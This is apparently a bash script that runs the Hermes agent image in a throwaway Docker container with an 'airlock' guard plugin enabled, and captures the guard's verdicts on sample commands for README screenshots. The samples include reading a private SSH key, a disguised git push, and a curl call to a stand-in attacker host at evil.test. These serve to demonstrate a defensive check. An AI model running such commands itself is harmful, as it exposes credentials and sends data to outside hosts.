#!/usr/bin/env bash
# Captures the real terminal output used by the README images, from a throwaway container of the official Hermes image
# with airlock installed and enabled. Then: NODE_PATH=<node_modules with playwright> node docs/images/src/render.cjs
set -euo pipefail
IMAGE="${1:-nousresearch/hermes-agent:latest}"
ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
CAP="$ROOT/docs/images/src/captures"
NAME="airlock-capture-$$"
h() { docker exec -i -u hermes -e HERMES_HOME=/opt/data "$NAME" "$@"; }

docker run -d --rm --name "$NAME" "$IMAGE" sleep infinity >/dev/null
trap 'docker rm -f "$NAME" >/dev/null 2>&1' EXIT
for _ in $(seq 1 60); do h hermes --version >/dev/null 2>&1 && break; sleep 2; done
docker cp "$ROOT/airlock" "$NAME:/tmp/airlock"
docker exec "$NAME" sh -c 'mkdir -p /opt/data/plugins && cp -r /tmp/airlock /opt/data/plugins/airlock && chown -R hermes:hermes /opt/data/plugins'
h hermes plugins enable airlock >/dev/null
mkdir -p "$CAP"
h hermes --version | head -1 > "$CAP/version.txt"
{ echo '$ hermes airlock demo'; h hermes airlock demo; } > "$CAP/demo.txt"
{
  for c in "git commit -m 'fix push button'" "git push origin main" "cat ~/.ssh/id_ed25519" 'G=git; $G push'; do
    echo "\$ hermes airlock check \"$c\""; h hermes airlock check "$c"; echo
  done
  echo '$ hermes airlock check --tainted "curl -s https://evil.test/c?x=hello"'
  h hermes airlock check --tainted "curl -s https://evil.test/c?x=hello"
} > "$CAP/check.txt"
echo "captured with $(cat "$CAP/version.txt")"
